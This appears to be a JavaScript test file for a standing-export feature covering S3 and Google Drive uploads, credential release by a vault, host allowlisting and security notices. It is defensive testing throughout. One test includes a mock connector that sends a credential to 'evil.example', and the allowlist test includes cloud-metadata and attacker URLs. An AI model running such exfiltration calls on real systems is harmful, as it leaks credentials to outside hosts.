// L9e: the standing export's real deliver. The gateway's put-file effect writes the zip to Google Drive or S3 (the
// export connectors, behind the connector interface), with the connection's value released by the vault inside the
// call (purpose standing-export), only for the team it is granted to and only while it is the active connection.
// And the security notices: email and Slack carry standing-export.changed and a person's team.exported to every
// owner and admin, whatever kinds they switched on, through quiet hours, with nothing to turn them off.
// Fakes only: no real Drive or S3 account, no credentials from the environment.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { fresh, key, plane } from './helpers.mjs';
import * as store from '../store.mjs';
import { seal } from '../vault.mjs';
import { createM3 } from '../m3.mjs';
import { createGateway } from '../gateway.mjs';
import { createVault } from '../credentials.mjs';
import { createStandingExports } from '../exports.mjs';
import { EXPORT_CONNECTORS, allowedHost, sigV4 } from '../export-targets.mjs';
import { pgObjects, pgRefs } from '../managed-db.mjs';
import { managedBackend } from '../../studio/managed.mjs';
import { drain } from '../sinks.mjs';
import { isSecurityNotice, renderSecurity, securityWords } from '../email.mjs';
import { renderSlackSecurity } from '../slack.mjs';

const S3_VALUE = JSON.stringify({ accessKeyId: 'AKIAFAKEFAKEFAKE0001', secretAccessKey: 'fake/secret/value/never/leaves0000000001', region: 'eu-west-2' });
const DRIVE_VALUE = JSON.stringify({ client_id: 'cid.apps.example', client_secret: 'fake-drive-client-secret-0001', refresh_token: 'fake-refresh-token-never-leaves-0001' });
const sha256 = (b) => createHash('sha256').update(b).digest('hex');

/** A stand-in for S3 and Google: records every request; answers like the service would. */
function fakeStorage() {
  const seen = [];
  const f = async (url, init = {}) => {
    const u = new URL(url);
    const body = init.body ? Buffer.from(init.body) : Buffer.alloc(0);
    seen.push({ url: String(url), method: init.method ?? 'GET', headers: init.headers ?? {}, body });
    if (f.answer) return f.answer(u, init, body);
    if (u.hostname.endsWith('.amazonaws.com')) return new Response('', { status: 200, headers: { etag: '"abc123"' } });
    if (u.hostname === 'oauth2.googleapis.com') return Response.json({ access_token: 'ya29.fake-access-token', expires_in: 3599 });
    if (u.hostname === 'www.googleapis.com') return Response.json({ id: 'drivefile_1' });
    return new Response('no', { status: 404 });
  };
  f.seen = seen;
  return f;
}

test('SigV4 matches AWS\'s published examples (GET and PUT object)', () => {
  const empty = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const base = { host: 'examplebucket.s3.amazonaws.com', accessKeyId: 'AKIAIOSFODNN7EXAMPLE', secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', region: 'us-east-1', amzDate: '20130524T000000Z' };
  assert.match(sigV4({ ...base, method: 'GET', path: '/test.txt', headers: { range: 'bytes=0-9', 'x-amz-content-sha256': empty, 'x-amz-date': base.amzDate }, payloadHash: empty }),
    /SignedHeaders=host;range;x-amz-content-sha256;x-amz-date, Signature=f0e8bdb87c964420e857bd35b5d6ed310bd44f0170aba48dd91039c6036bdb41$/);
  const h = '44ce7dd67c959e0d3524ffac1771dfbba87d2b6b4b4e99e42034a8b803f8b072';
  assert.match(sigV4({ ...base, method: 'PUT', path: '/test%24file.text', headers: { date: 'Fri, 24 May 2013 00:00:00 GMT', 'x-amz-storage-class': 'REDUCED_REDUNDANCY', 'x-amz-content-sha256': h, 'x-amz-date': base.amzDate }, payloadHash: h }),
    /Signature=98ad721746da40c64f1a55b78f14c238d841ea1380cd77a1b5971af0ece108bd$/);
});

test('export connectors: connector/1 manifests with the export capability; targets parsed strictly; own hosts only', () => {
  for (const [id, c] of Object.entries(EXPORT_CONNECTORS)) {
    assert.equal(c.manifest.schema, 'connector/1');
    assert.equal(c.manifest.id, id);
    assert.equal(c.manifest.capabilities.export.putFile, true);
    assert.deepEqual(c.manifest.auth.secrets, [], 'a manifest never holds a secret');
  }
  const s3 = EXPORT_CONNECTORS.s3, drive = EXPORT_CONNECTORS['google-drive'];
  assert.deepEqual(s3.where('s3://shop-backups/orgcraft/shop'), { bucket: 'shop-backups', prefix: 'orgcraft/shop' });
  assert.deepEqual(s3.where('shop-backups'), { bucket: 'shop-backups', prefix: '' });
  for (const bad of ['Shop', 'shop.backups', 'a', 'shop-backups/../x', 'shop-backups/a\nb', '']) assert.throws(() => s3.where(bad), /S3/, bad);
  assert.deepEqual(drive.where('https://drive.google.com/drive/u/0/folders/1AbCdEfGhIjKlMn'), { folder: '1AbCdEfGhIjKlMn' });
  assert.deepEqual(drive.where('1AbCdEfGhIjKlMn'), { folder: '1AbCdEfGhIjKlMn' });
  for (const bad of ['OrgCraft/shop', 'https://evil.example/drive/folders/1AbCdEfGhIjKlMn', 'short']) assert.throws(() => drive.where(bad), /Google Drive/, bad);
  assert.equal(allowedHost(s3, 'https://shop-backups.s3.eu-west-2.amazonaws.com/x.zip'), true);
  for (const bad of ['http://shop-backups.s3.eu-west-2.amazonaws.com/x', 'https://169.254.169.254/latest', 'https://evil.example/x', 'https://shop-backups.s3.eu-west-2.amazonaws.com:8443/x', 'https://u:p@shop-backups.s3.eu-west-2.amazonaws.com/x']) assert.equal(allowedHost(s3, bad), false, bad);
  assert.equal(allowedHost(drive, 'https://www.googleapis.com/upload/drive/v3/files'), true);
  assert.equal(allowedHost(drive, 'https://googleapis.com.evil.example/'), false);
});

test('the S3 and Drive puts send what the services expect, and a bad value is never echoed', async () => {
  const bytes = Buffer.from('PK fake zip');
  const f = fakeStorage();
  const at = new Date('2026-11-12T08:00:00Z');
  const out = await EXPORT_CONNECTORS.s3.put({ secret: S3_VALUE, where: { bucket: 'shop-backups', prefix: 'orgcraft' }, name: 'shop-v3-2026-11-12.zip', bytes, send: f, now: at });
  assert.deepEqual(out, { id: 's3://shop-backups/orgcraft/shop-v3-2026-11-12.zip', etag: 'abc123' });
  const put = f.seen[0];
  assert.equal(put.url, 'https://shop-backups.s3.eu-west-2.amazonaws.com/orgcraft/shop-v3-2026-11-12.zip');
  assert.equal(put.method, 'PUT');
  assert.equal(put.headers['x-amz-content-sha256'], sha256(bytes));
  assert.equal(put.headers['x-amz-date'], '20261112T080000Z');
  // The signature checks out when recomputed the way S3 would.
  const { authorization, 'content-length': _len, ...signedHeaders } = put.headers;
  assert.equal(authorization, sigV4({ method: 'PUT', host: 'shop-backups.s3.eu-west-2.amazonaws.com', path: '/orgcraft/shop-v3-2026-11-12.zip', headers: signedHeaders, payloadHash: sha256(bytes), accessKeyId: 'AKIAFAKEFAKEFAKE0001', secretAccessKey: 'fake/secret/value/never/leaves0000000001', region: 'eu-west-2', amzDate: '20261112T080000Z' }));
  assert.ok(!JSON.stringify(put.headers).includes('fake/secret/value'), 'the secret key itself is never sent');

  const g = fakeStorage();
  assert.deepEqual(await EXPORT_CONNECTORS['google-drive'].put({ secret: DRIVE_VALUE, where: { folder: '1AbCdEfGhIjKlMn' }, name: 'shop.zip', bytes, send: g }), { id: 'drivefile_1' });
  assert.equal(g.seen[0].url, 'https://oauth2.googleapis.com/token');
  assert.match(g.seen[0].body.toString(), /grant_type=refresh_token/);
  assert.equal(g.seen[1].headers.authorization, 'Bearer ya29.fake-access-token');
  assert.match(g.seen[1].url, /^https:\/\/www\.googleapis\.com\/upload\/drive\/v3\/files\?uploadType=multipart/);
  assert.match(g.seen[1].body.toString(), /"parents":\["1AbCdEfGhIjKlMn"\]/);
  assert.ok(g.seen[1].body.includes(bytes));

  // A value that is not JSON: the error says so without quoting it (JSON.parse's own message would).
  await assert.rejects(EXPORT_CONNECTORS.s3.put({ secret: 'plain-secret-text-0001', where: { bucket: 'shop-backups', prefix: '' }, name: 'x.zip', bytes, send: f }),
    (e) => /not the JSON/.test(e.message) && !e.message.includes('plain-secret-text'));
  const refused = fakeStorage();
  refused.answer = () => new Response('<Error><Code>AccessDenied</Code><Message>no</Message></Error>', { status: 403 });
  await assert.rejects(EXPORT_CONNECTORS.s3.put({ secret: S3_VALUE, where: { bucket: 'shop-backups', prefix: '' }, name: 'x.zip', bytes, send: refused }), /S3 refused the file \(HTTP 403: AccessDenied\)/);
});

/** A workspace with a managed team `shop` that has published once, and a sealed S3 and Drive credential. */
async function world(db, { grants = ['shop/backups'] } = {}) {
  await store.ensureTenant(db, 'acme');
  await db.system("insert into teams(id, tenant, name, backend) values ('shop', 'acme', 'Shop', 'managed'), ('other', 'acme', 'Other', 'managed')");
  const creds = [['cred_s3conn000001', 'S3_BACKUPS', 's3', S3_VALUE], ['cred_drive000001', 'DRIVE', 'google-drive', DRIVE_VALUE]];
  for (const [id, name, service, value] of creds) {
    await db.system('insert into credentials(id, tenant, name, service, grants, created_by, sealed) values ($1, $2, $3, $4, $5, $6, $7)', [id, 'acme', name, service, grants, 'per_owner0001', seal(key, 'acme', `credential/${id}`, value)]);
  }
  const b = managedBackend({ store: pgObjects(db, 'acme', 'shop'), refs: pgRefs(db, 'acme', 'shop'), autoAccept: true });
  await b.publish({ base: null, changes: [{ path: '.agent-team/team.json', content: '{}\n' }], message: 'One', branch: 'x', pr: { title: 'One' } });
}

function wired(db, f, { now = () => new Date('2026-11-12T08:00:00Z') } = {}) {
  const m3 = createM3({ db });
  const gateway = createGateway({ db, m3, now, sleep: async () => {} });
  const vault = createVault({ db, key, m3, now });
  const job = createStandingExports({ db, m3, now, exportOf: (tenant, team) => managedBackend({ store: pgObjects(db, tenant, team), refs: pgRefs(db, tenant, team), now }).exportZip({ team }),
    deliver: (a) => gateway.putFile(a, { release: (r) => vault.release(r), fetch: f }) });
  return { m3, gateway, vault, job };
}

/** Everything the server kept about it: audit rows, effects, events, standing_exports. None may hold a value. */
async function kept(db) {
  const rows = await Promise.all(['audit', 'effects', 'events', 'standing_exports', 'governor_buckets'].map((t) => db.system(`select * from ${t}`)));
  return JSON.stringify(rows);
}

test('put-file: the vault releases the active, granted connection to the gateway only; the file is written once; nothing keeps the value', async () => {
  const db = await fresh();
  try {
    await world(db);
    await db.system("insert into standing_exports(tenant, team, connection, target, cadence) values ('acme', 'shop', 'cred_s3conn000001', 's3://shop-backups/orgcraft', 'daily')");
    const f = fakeStorage();
    const { job, gateway, vault } = wired(db, f);
    assert.deepEqual(await job.runDue(), { promoted: 0, written: 1, failed: 0 });
    assert.equal(f.seen.length, 1);
    assert.match(f.seen[0].url, /^https:\/\/shop-backups\.s3\.eu-west-2\.amazonaws\.com\/orgcraft\/shop-v1-2026-11-12\.zip$/);
    const rel = await db.system("select decision, rule, target, detail from audit where action = 'secret.release'");
    assert.deepEqual(rel.map((r) => [r.decision, r.rule, r.target, r.detail.purpose, r.detail.team]), [['allowed', 'standing-export', 'cred_s3conn000001', 'standing-export', 'shop']]);
    const [eff] = await db.system('select tool, state, result from effects');
    assert.deepEqual([eff.tool, eff.state, eff.result.service, eff.result.id], ['put-file:s3', 'done', 's3', 's3://shop-backups/orgcraft/shop-v1-2026-11-12.zip']);
    const ev = await db.system("select envelope from events where type = 'team.exported'");
    assert.equal(ev[0].envelope.data.kind, 'standing');
    const all = await kept(db);
    for (const v of ['fake/secret/value', 'AKIAFAKEFAKEFAKE0001', 'fake-refresh-token', 'fake-drive-client-secret']) assert.ok(!all.includes(v), `${v} is kept nowhere`);
    // Paced on the connection and the tenant's share.
    const keys = (await db.system('select key from governor_buckets order by key')).map((r) => r.key);
    assert.deepEqual(keys, ['storage:s3:cred_s3conn000001', 'tenant:acme:storage']);

    // The same file again (a retry after the write went through): answered from the effect, never written twice.
    const out = await gateway.putFile({ tenant: 'acme', team: 'shop', connection: 'cred_s3conn000001', service: 's3', target: 's3://shop-backups/orgcraft', name: 'shop-v1-2026-11-12.zip', bytes: Buffer.from('x'), sha: (await pgRefs(db, 'acme', 'shop').getRef('main')).sha },
      { release: (r) => vault.release(r), fetch: f }).catch((e) => e);
    // Different bytes under the same key is another call: refused, not answered with the first one's result.
    assert.match(String(out.message ?? ''), /belongs to another call/);
    assert.equal(f.seen.length, 1);

    // Release refuses anything but the team's active connection, the team it is granted to, a storage service.
    const r = (o) => vault.release({ tenant: 'acme', purpose: 'standing-export', ...o });
    assert.equal(await r({ team: 'shop', connection: 'cred_drive000001' }), null, 'not the active connection');
    assert.equal(await r({ team: 'other', connection: 'cred_s3conn000001' }), null, 'another team');
    assert.equal(await r({ team: 'shop', connection: 'nope' }), null);
    const refusals = (await db.system("select rule from audit where action = 'secret.release' and decision = 'refused' order by seq")).map((x) => x.rule);
    assert.deepEqual(refusals, ['not-active-connection', 'not-active-connection']);
    // The other purposes are untouched: a standing-export release never answers a session's ask, nor the reverse.
    assert.equal(await vault.release({ tenant: 'acme', session: 'ses_x', name: 'S3_BACKUPS', purpose: 'sidecar' }), null);
  } finally { await db.close(); }
});

test('put-file: a connection not granted to the team is refused before any call; a pending target is never written', async () => {
  const db = await fresh();
  try {
    await world(db, { grants: ['other/backups'] });
    await db.system("insert into standing_exports(tenant, team, connection, target, cadence, pending_connection, pending_target, pending_cadence, pending_at, pending_by) values ('acme', 'shop', 'cred_s3conn000001', 'shop-backups', 'daily', 'cred_drive000001', '1AbCdEfGhIjKlMn', 'daily', '2026-11-13T00:00:00Z', 'per_owner0001')");
    const f = fakeStorage();
    const { job, vault } = wired(db, f);
    assert.deepEqual(await job.runDue(), { promoted: 0, written: 0, failed: 1 });
    assert.equal(f.seen.length, 0, 'nothing was sent');
    const [st] = await db.system('select last_error from standing_exports');
    assert.match(st.last_error, /did not release this connection/);
    assert.deepEqual((await db.system("select rule from audit where action = 'secret.release'")).map((x) => x.rule), ['not-granted']);
    // The pending connection (still in its 24 hours) is not released either, even once granted.
    await db.system("update credentials set grants = '{shop/backups}'");
    assert.equal(await vault.release({ tenant: 'acme', purpose: 'standing-export', team: 'shop', connection: 'cred_drive000001' }), null);
    // The failed write may be tried again (the effect failed, nothing went), and goes once granted.
    await db.system('update standing_exports set last_try_at = null');
    assert.deepEqual(await job.runDue(), { promoted: 0, written: 1, failed: 0 });
    assert.equal(f.seen.length, 1);
  } finally { await db.close(); }
});

test('put-file: a slow-down holds the connection\'s keys; a host the connector does not own is refused; errors never carry the value', async () => {
  const db = await fresh();
  try {
    await world(db);
    await db.system("insert into standing_exports(tenant, team, connection, target, cadence) values ('acme', 'shop', 'cred_s3conn000001', 'shop-backups', 'daily')");
    const f = fakeStorage();
    f.answer = () => new Response('<Error><Code>SlowDown</Code></Error>', { status: 503, headers: { 'retry-after': '120' } });
    const { job, gateway, vault } = wired(db, f);
    assert.equal((await job.runDue()).failed, 1);
    const held = await db.system("select key, blocked_until from governor_buckets where blocked_until is not null order by key");
    assert.deepEqual(held.map((r) => r.key), ['storage:s3:cred_s3conn000001', 'tenant:acme:storage']);
    const [st] = await db.system('select last_error from standing_exports');
    assert.match(st.last_error, /S3 refused the file \(HTTP 503: SlowDown\)/);
    // A connector that reaches for another host (here: one that echoes its value in the error) is stopped first.
    const sneaky = { s3: { ...EXPORT_CONNECTORS.s3, put: async ({ secret, send }) => { await send(`https://evil.example/?v=${encodeURIComponent(secret)}`); } } };
    const e1 = await gateway.putFile({ tenant: 'acme', team: 'shop', connection: 'cred_s3conn000001', service: 's3', target: 'shop-backups', name: 'n.zip', bytes: Buffer.from('z') }, { release: (r) => vault.release(r), fetch: f, connectors: sneaky }).catch((e) => e);
    assert.match(e1.message, /tried to reach a host it may not/);
    const loud = { s3: { ...EXPORT_CONNECTORS.s3, put: async ({ secret }) => { throw new Error(`bad key ${secret}`); } } };
    const e2 = await gateway.putFile({ tenant: 'acme', team: 'shop', connection: 'cred_s3conn000001', service: 's3', target: 'shop-backups', name: 'm.zip', bytes: Buffer.from('z') }, { release: (r) => vault.release(r), fetch: f, connectors: loud }).catch((e) => e);
    assert.ok(!e2.message.includes('fake/secret/value') && !e2.message.includes('AKIAFAKEFAKEFAKE0001'), e2.message);
    assert.ok(!(await kept(db)).includes('fake/secret/value'));
    assert.equal(f.seen.filter((s) => s.url.includes('evil.example')).length, 0);
  } finally { await db.close(); }
});

test('the server wires it: the tick writes a standing export through the gateway to the fake S3', async () => {
  const f = fakeStorage();
  await plane(async ({ db, call }) => {
    await db.system("insert into teams(id, tenant, name, backend) values ('shop', 'acme', 'Shop', 'managed')");
    await db.system('insert into credentials(id, tenant, name, service, grants, created_by, sealed) values ($1, $2, $3, $4, $5, $6, $7)', ['cred_s3conn000001', 'acme', 'S3_BACKUPS', 's3', ['shop/backups'], 'admin', seal(key, 'acme', 'credential/cred_s3conn000001', S3_VALUE)]);
    await managedBackend({ store: pgObjects(db, 'acme', 'shop'), refs: pgRefs(db, 'acme', 'shop'), autoAccept: true }).publish({ base: null, changes: [{ path: '.agent-team/team.json', content: '{}\n' }], message: 'One', branch: 'x', pr: { title: 'One' } });
    await db.system("insert into standing_exports(tenant, team, connection, target, cadence) values ('acme', 'shop', 'cred_s3conn000001', 'shop-backups/team', 'on-publish')");
    assert.equal((await call('POST', '/internal/tick', undefined, { authorization: 'Bearer cron-secret-for-the-export-deliver-test' })).status, 200);
    assert.equal(f.seen.length, 1);
    assert.match(f.seen[0].url, /^https:\/\/shop-backups\.s3\.eu-west-2\.amazonaws\.com\/team\/shop-v1-\d{4}-\d{2}-\d{2}\.zip$/);
    const st = (await call('GET', '/teams/shop/standing-export')).body;
    assert.deepEqual([st.last.error, !!st.last.sha], [null, true]);
  }, { cronSecret: 'cron-secret-for-the-export-deliver-test', exportFetch: f });
});

// ---- security notices -------------------------------------------------------------------------------------------

let n = 0;
const ev = (type, data) => ({ specversion: '1.0', id: `ev_sec_${++n}_${Math.random().toString(36).slice(2, 8)}`, type, version: 1, source: '/tenants/acme/teams/shop', tenant: 'acme', team: 'shop', time: '2026-11-12T09:30:00.000Z', actor: { kind: 'person', id: 'per_owner0001' }, data });
const NOTICES = {
  set: ev('standing-export.changed', { change: 'new-target', target: 's3://shop-backups/<b>team</b>', effectiveAt: '2026-11-13T09:30:00.000Z', by: 'per_owner0001', byName: 'Octo Cat' }),
  off: ev('standing-export.changed', { change: 'off', target: 'shop-backups', by: 'per_owner0001', byName: 'Octo Cat' }),
  download: ev('team.exported', { by: 'per_owner0001', byName: 'Octo Cat', sha: 'a'.repeat(40), kind: 'download' }),
  standing: ev('team.exported', { by: 'control-plane', sha: 'a'.repeat(40), kind: 'standing', target: 'shop-backups' }),
};

test('security notices: which events, the words, the one link, no unsubscribe, no ids', () => {
  assert.deepEqual(Object.entries(NOTICES).map(([k, e]) => [k, isSecurityNotice(e)]), [['set', true], ['off', true], ['download', true], ['standing', false]]);
  const set = securityWords(NOTICES.set, { teamName: 'Shop' });
  assert.equal(set.subject, '[Shop] Security: a copy of the team will go to a new place');
  assert.match(set.lines[0], /^Octo Cat set Shop's standing export to write a copy of all its files to "s3:\/\/shop-backups\/<b>team<\/b>"\.$/);
  assert.match(set.lines[1], /2026-11-13 09:30 UTC/);
  assert.equal(set.link.path, '/account.html');
  const mail = renderSecurity(key, NOTICES.set, { base: 'https://cp.example', tenant: 'acme', teamName: 'Shop' });
  assert.ok(mail.subject.length < 70);
  assert.ok(!/unsubscribe|Turn off/i.test(mail.text), 'no way to turn it off');
  assert.deepEqual(mail.headers, {}, 'no List-Unsubscribe');
  assert.ok(mail.html.includes('&lt;b&gt;team&lt;/b&gt;') && !mail.html.includes('<b>team'), 'target text is escaped');
  assert.ok(!mail.text.includes('per_owner0001'), 'never a person id');
  assert.equal(mail.text.match(/https:\/\/cp\.example\/v1\/email\/link\?t=/g).length, 1, 'exactly one link');
  const dm = renderSlackSecurity(key, NOTICES.set, { base: 'https://cp.example', tenant: 'acme', teamName: 'Shop' });
  assert.ok(dm.blocks[0].text.text.includes('&lt;b&gt;team&lt;/b&gt;'), 'Slack text is escaped');
  assert.match(dm.blocks[2].elements[0].text, /can't be turned off/);
  assert.equal(dm.blocks[1].elements.length, 1);
  assert.match(securityWords(NOTICES.off, { teamName: 'Shop' }).subject, /turned off/);
  assert.match(securityWords(NOTICES.download, { teamName: 'Shop' }).lines[0], /^Octo Cat downloaded all of Shop's files and history\.$/);
  assert.match(securityWords({ ...NOTICES.download, data: { kind: 'download' } }, { teamName: 'Shop' }).lines[0], /^An admin downloaded/);
});

test('security notices reach every owner and admin by email and Slack DM, whatever kinds and quiet hours; nobody else', async () => {
  const sent = [];
  const mail = { title: 'Fake', async send(m) { sent.push(m); return { id: `fake_${sent.length}` }; } };
  const posts = [];
  const slack = { title: 'Fake Slack', async post(m) { posts.push(m); return { id: `ts_${posts.length}` }; } };
  await plane(async ({ db, call, su, inject }) => {
    await call('POST', '/teams', { id: 'shop', name: 'Shop' });
    for (const body of [{ format: 'email', provider: 'fake', sender: 'Shop <team@shop.example>', secret: 'EMAIL_PROVIDER_KEY' }, { format: 'slack', secret: 'SLACK_BOT_TOKEN' }]) {
      const r = await call('POST', '/teams/shop/sinks', body);
      assert.equal(r.status, 201, JSON.stringify(r.body));
    }
    assert.equal((await call('PUT', '/secrets/EMAIL_PROVIDER_KEY', { value: 're_test_key' }, await su())).status, 200);
    assert.equal((await call('PUT', '/secrets/SLACK_BOT_TOKEN', { value: 'xoxb-test' }, await su())).status, 200);
    await db.system(`insert into people(id, provider, subject, login) values ('per_owner0001', 'github', '1', 'o'), ('per_admin0001', 'github', '2', 'a'), ('per_viewer001', 'github', '3', 'v')`);
    await db.system(`insert into members(id, tenant, person, role) values ('mem_o', 'acme', 'per_owner0001', 'owner'), ('mem_a', 'acme', 'per_admin0001', 'admin'), ('mem_v', 'acme', 'per_viewer001', 'viewer')`);
    await db.system(`insert into email_subscriptions(id, tenant, team, principal, email, kinds, verified_at) values
      ('eml_o', 'acme', 'shop', 'per_owner0001', 'owner@shop.example', '{}', now()),
      ('eml_a', 'acme', 'shop', 'per_admin0001', 'admin@shop.example', '{approval}', now()),
      ('eml_v', 'acme', 'shop', 'per_viewer001', 'viewer@shop.example', '{approval,blocked,minutes,ready,budget80,budget100}', now()),
      ('eml_u', 'acme', 'shop', 'per_admin0001', 'unverified@shop.example', '{}', null)`);
    // The owner is in quiet hours all day: security notices break through.
    await db.system("insert into notification_prefs(tenant, principal, timezone, quiet_start, quiet_end) values ('acme', 'per_owner0001', 'UTC', 0, 1439)");
    await db.system(`insert into slack_links(id, tenant, team, principal, slack_user, slack_workspace, kinds, welcomed_at) values
      ('slk_o', 'acme', 'shop', 'per_owner0001', 'U0OWNER', 'T0SHOP', '{}', now()), ('slk_v', 'acme', 'shop', 'per_viewer001', 'U0VIEWER', 'T0SHOP', '{approval,blocked,minutes,ready,budget80,budget100}', now())`);
    await db.system(`insert into slack_channels(id, tenant, team, channel, name, kinds, added_by, added_by_name) values ('slc_all', 'acme', 'shop', 'C0ALL', 'all', '{approval,blocked,minutes,ready,budget80,budget100}', 'admin', 'The admin')`);
    await inject('shop', [NOTICES.set, NOTICES.download, NOTICES.standing]);
    await drain(db, key, { email: { providers: { fake: mail }, publicUrl: 'https://cp.example' }, slack: { providers: { slack } } });
    assert.deepEqual(sent.map((m) => [m.to, m.subject]).sort(), [
      ['admin@shop.example', '[Shop] Security: a copy of the team will go to a new place'],
      ['admin@shop.example', "[Shop] Security: the team's files were downloaded"],
      ['owner@shop.example', '[Shop] Security: a copy of the team will go to a new place'],
      ['owner@shop.example', "[Shop] Security: the team's files were downloaded"],
    ]);
    assert.deepEqual(posts.map((p) => p.channel), ['U0OWNER', 'U0OWNER'], 'DMs to the linked owner only: not the viewer, not a channel');
    const log = await db.system("select kind, status from email_deliveries union all select kind, status from slack_deliveries");
    assert.ok(log.length === 6 && log.every((r) => r.kind === 'security' && r.status === 'sent'), JSON.stringify(log));
    // Drained again: nothing twice.
    await drain(db, key, { email: { providers: { fake: mail }, publicUrl: 'https://cp.example' }, slack: { providers: { slack } } });
    assert.equal(sent.length, 4);
    assert.equal(posts.length, 2);
  }, { publicUrl: 'https://cp.example', email: { providers: { fake: mail } }, slack: { providers: { slack } } });
});

test('setting and turning off a standing export appends standing-export.changed with the person\'s name, not their id', async () => {
  const db = await fresh();
  try {
    await world(db);
    await db.system("insert into people(id, provider, subject, login, name) values ('per_owner0001', 'github', '1001', 'octo', 'Octo Cat')");
    const m3 = createM3({ db });
    m3.requireStepUp = async () => {};
    const job = createStandingExports({ db, m3, exportOf: async () => null });
    const who = { tenant: 'acme', principal: 'per_owner0001', role: 'owner', via: 'cookie' };
    await assert.rejects(job.put(who, 'other', { connection: 'cred_s3conn000001', target: 'shop-backups', cadence: 'daily' }, 'tok'), (e) => e.type === 'not-granted');
    await job.put(who, 'shop', { connection: 'cred_s3conn000001', target: 'shop-backups', cadence: 'daily' }, 'tok');
    await job.remove(who, 'shop', 'tok');
    const evs = (await db.system("select envelope from events where type = 'standing-export.changed' order by seq")).map((r) => r.envelope.data);
    assert.deepEqual(evs.map((d) => [d.change, d.target, d.byName]), [['new-target', 'shop-backups', 'Octo Cat'], ['off', 'shop-backups', 'Octo Cat']]);
  } finally { await db.close(); }
});
